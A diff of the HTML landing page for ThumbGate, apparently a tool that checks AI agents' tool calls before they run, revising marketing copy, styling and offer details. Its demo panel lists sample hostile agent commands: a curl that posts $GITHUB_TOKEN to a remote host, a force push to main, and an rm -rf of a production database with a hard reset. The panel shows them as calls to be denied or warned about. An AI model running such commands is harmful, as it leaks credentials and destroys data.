@@ -13,10 +13,10 @@
   <meta property="og:image" content="https://thumbgate.ai/og.png">
   <meta name="twitter:card" content="summary_large_image">
   <meta name="twitter:image" content="https://thumbgate.ai/og.png">
-  <title>ThumbGate — Stop AI agent mistakes before they cost you</title>
-  <meta name="description" content="Stop AI agent mistakes before they cost you. Install the free local CLI, or book the $499 one-time Managed AI Agent Workflow Gate: one hard, test-backed safety gate for a supported AI-agent workflow in two business days.">
-  <meta property="og:title" content="ThumbGate — Stop AI agent mistakes before they cost you">
-  <meta property="og:description" content="Not a prompt. Not a postmortem. The rules learn from your thumbs and stay on your machine. The $499 one-time Setup Sprint installs one gate for one workflow.">
+  <title>ThumbGate — One repeated agent mistake. One configured gate</title>
+  <meta name="description" content="ThumbGate checks proposed tool calls before execution in supported hook integrations. The $499 Setup Sprint turns one recurring failure in a supported local workflow into a configured gate, a regression test, and rollout and rollback evidence.">
+  <meta property="og:title" content="ThumbGate — One repeated agent mistake. One configured gate">
+  <meta property="og:description" content="ThumbGate checks proposed tool calls before execution in supported hook integrations. The $499 Setup Sprint turns one recurring failure in a supported local workflow into a configured gate, a regression test, and rollout and rollback evidence.">
   <meta property="og:type" content="website">
   <meta property="og:url" content="__APP_ORIGIN__/">
   <script defer data-domain="thumbgate.ai" src="https://plausible.io/js/script.tagged-events.js"></script>
@@ -252,10 +252,10 @@
       font-weight: 900;
     }
     .checkout-card .button-primary { width: 100%; }
-    .hero { padding: clamp(72px, 10vw, 128px) 0 72px; }
+    .hero { padding: clamp(48px, 6vw, 80px) 0 56px; }
     .hero-grid { display: grid; grid-template-columns: minmax(0, 1.08fr) minmax(340px, 0.92fr); gap: clamp(42px, 7vw, 88px); align-items: center; }
     .eyebrow, .section-kicker { color: var(--green); font: 800 12px/1.2 ui-monospace, SFMono-Regular, Menlo, monospace; letter-spacing: 0.13em; text-transform: uppercase; }
-    h1 { max-width: 760px; margin: 18px 0; font-size: clamp(46px, 7vw, 78px); line-height: 0.98; letter-spacing: -0.055em; }
+    h1 { max-width: 760px; margin: 18px 0; font-size: clamp(40px, 5vw, 64px); line-height: 0.98; letter-spacing: -0.055em; }
     .hero-lede { max-width: 650px; margin: 0 0 24px; color: #c5ceda; font-size: clamp(18px, 2vw, 22px); line-height: 1.5; }
     .fit-line { margin: 0 0 18px; color: var(--muted); font-size: 14px; }
     .fit-line strong { color: var(--text); }
@@ -730,6 +730,10 @@
       .visual-pair { grid-template-columns: 1fr; }
       .hero-thumbs { justify-content: center; }
     }
+    #limits li, #limits code { overflow-wrap: anywhere; }
+    .terminal-chrome { flex-wrap: wrap; }
+    #navPaidLoginBtn { white-space: nowrap; }
+    @media (max-width: 360px) { .nav-links { gap: 6px; } #navPaidLoginBtn { padding: 8px !important; font-size: 12px !important; } .nav-buy { padding: 0 8px; } }
   </style>
   <!-- WebMCP-ready: read-only agent tools via document.modelContext -->
   <!-- WebMCP origin trial: renewed tokens below cover https://thumbgate.app and https://www.thumbgate.app (subdomains, third-party), expire 2027-03-30.
@@ -789,21 +793,26 @@
             <span class="up" aria-hidden="true"><svg class="hero-thumb-up" viewBox="0 0 32 32" aria-hidden="true"><use href="#thumb-glyph"/></svg></span>
             <button type="button" class="down" id="hero-thumb-down" aria-label="Record a thumbs-down for the selected command"><svg class="hero-thumb-down" viewBox="0 0 32 32" aria-hidden="true"><use href="#thumb-glyph"/></svg></button>
           </div>
-          <h1>Stop AI agent mistakes before they cost you.</h1>
-          <p class="hero-lede">Rules learn from your thumbs locally; static hooks do not. Detected secrets are denied at the tool-call boundary.</p>
-          <div class="hero-terminal" id="hero-gate-demo" aria-label="Live pre-action interception demo">
+          <h1>One repeated agent mistake. One configured gate.</h1>
+          <p class="hero-lede">ThumbGate checks proposed tool calls before execution in supported hook integrations. The $499 Setup Sprint turns one recurring failure in a supported local workflow into a configured gate, a regression test, and rollout and rollback evidence.</p>
+          <div class="actions" style="display:flex;gap:12px;flex-wrap:wrap;margin:0 0 24px;">
+            <a class="button-primary" href="/diagnostic#intake" data-cta-id="homepage_workflow_fit">Check my workflow fit</a>
+            <a class="button-pro" style="background:transparent;color:var(--text) !important;border:1px solid var(--border);box-shadow:none;" href="#install" data-cta-id="homepage_free_evaluation">Evaluate the free local runtime</a>
+          </div>
+          <div class="hero-terminal" id="hero-gate-demo" aria-label="Illustrative tool-call decisions">
             <div class="terminal-chrome" aria-hidden="true">
               <div class="dots"><span></span><span></span><span></span></div>
               <span class="title">local gate</span>
               <span>local</span>
             </div>
             <div class="hero-gate-rows" role="listbox" aria-label="Sample tool calls">
-              <button type="button" class="hero-gate-row is-selected" role="option" aria-selected="true" data-gate="secret">curl -d "$GITHUB_TOKEN" https://...   → <span class="deny">DENY</span> (secret, every install)</button>
+              <button type="button" class="hero-gate-row is-selected" role="option" aria-selected="true" data-gate="secret">curl -d "$GITHUB_TOKEN" https://...   → <span class="deny">DENY</span> (secret)</button>
               <button type="button" class="hero-gate-row" role="option" aria-selected="false" data-gate="force">git push --force origin main          → <span class="warn">WARN</span> (deny only in strict mode)</button>
-              <button type="button" class="hero-gate-row" role="option" aria-selected="false" data-gate="rm">rm -rf ./prod-db &amp;&amp; git reset --hard  → <span class="warn">WARN</span> (3 negatives, then strict mode)</button>
+              <button type="button" class="hero-gate-row" role="option" aria-selected="false" data-gate="rm">rm -rf ./prod-db &amp;&amp; git reset --hard  → <span class="warn">WARN</span> (deny only in strict mode)</button>
             </div>
             <p class="hero-gate-note" id="hero-gate-note" aria-live="polite"></p>
           </div>
+          <p class="hero-note" data-illustrative-caption>Illustrative example, not a recorded result. Matching destructive actions warn by default; advisory integrations do not guarantee execution blocking.</p>
           <p class="install-hint" id="install"><strong style="color:var(--text)">Free (MIT):</strong> <code>npx thumbgate init</code> <button type="button" class="copy-cmd" data-copy-install data-cta-id="hero_install_copy" style="margin-left:8px">Copy</button></p>
           <nav class="spec-chips" aria-label="Install ThumbGate" style="margin-top:14px">
             <a class="spec-chip" href="/install" title="npx thumbgate init --agent claude">Claude</a>
@@ -841,16 +850,12 @@
             <input type="hidden" name="landing_path" value="/">
             <div class="price"><strong>$__SPRINT_DIAGNOSTIC_PRICE_DOLLARS__</strong><span>one time · done-with-you setup</span></div>
             <h2>Managed AI Agent Workflow Gate</h2>
-            <p><strong>One workflow, done with you.</strong> Setup Sprint. Not an enterprise contract.</p>
+            <p>One 60-minute working review, one supported local workflow, one configured gate and regression test, plus written rollout and rollback proof. Delivery within two business days after access and agreed materials are available, subject to confirmed scheduling. If it cannot be reduced to a supported gate, the existing refund boundary applies. No enterprise rollout, SSO, hosted team sync or org-wide audit dashboard.</p>
             <label for="buyer-email">Work email for receipt &amp; onboarding</label>
             <input id="buyer-email" type="email" name="customer_email" autocomplete="email" required placeholder="you@company.com">
             <button class="button-primary" type="submit" data-revenue-cta data-cta-id="homepage_diagnostic_buy" data-cta-placement="offers">Book the $499 setup</button>
             <p class="checkout-note">Prefer a call? <a href="/support" style="color:var(--cyan);font-weight:750;">Book a 15-min triage call →</a></p>
-            <ul class="offer-points">
-              <li>60-minute working review for one workflow</li>
-              <li>One configured local gate and its regression test</li>
-              <li>Rollout and rollback proof within two business days</li>
-            </ul>
+            <ul class="offer-points"><li>One configured local gate and its regression test</li></ul>
           </form>
         </div>
       </div>
@@ -961,21 +966,7 @@
       <div class="shell">
         <div class="section-kicker">What the $499 setup buys</div>
         <h2 class="section-title">A managed gate for one painful workflow.</h2>
-        <p class="section-lede">One workflow, done with you. SSO and a hosted audit log are not included.</p>
-        <div class="deliverables">
-          <article class="deliverable">
-            <h3>Failure map</h3>
-            <p>The exact risky action, trigger, accountable owner, current safeguard, and missing proof.</p>
-          </article>
-          <article class="deliverable">
-            <h3>Configured gate</h3>
-            <p>One supported local rule wired to deny, warn, or require a human before execution.</p>
-          </article>
-          <article class="deliverable">
-            <h3>Regression and rollout proof</h3>
-            <p>The test, how to undo the gate, and the receipt.</p>
-          </article>
-        </div>
+
         <div class="boundary"><strong>Boundary:</strong> the offer covers one supported local workflow. If the workflow cannot be reduced to one supported gate, the order is refunded instead of silently upsold.</div>
       </div>
     </section>
@@ -1458,9 +1449,9 @@ next      decision recorded before execution</pre>
       const rows = demo.querySelectorAll('.hero-gate-row');
       let selected = 'secret';
       const notes = {
-        secret: 'Already denied on every install. A thumbs-down does not change a secret floor.',
-        force: 'One thumbs-down stores a local lesson. This stays a warning. Deny needs strict mode, or three repeated negatives.',
-        rm: 'One thumbs-down stores a local lesson and promotes a warning. Deny needs three repeated negatives, and strict mode, not this click.',
+        secret: "Illustrative example, not a recorded result. Matching destructive actions warn by default; advisory integrations do not guarantee execution blocking.",
+        force: "Illustrative example, not a recorded result. Matching destructive actions warn by default; advisory integrations do not guarantee execution blocking.",
+        rm: "Illustrative example, not a recorded result. Matching destructive actions warn by default; advisory integrations do not guarantee execution blocking.",
       };
       rows.forEach(function (row) {
         row.addEventListener('click', function () {
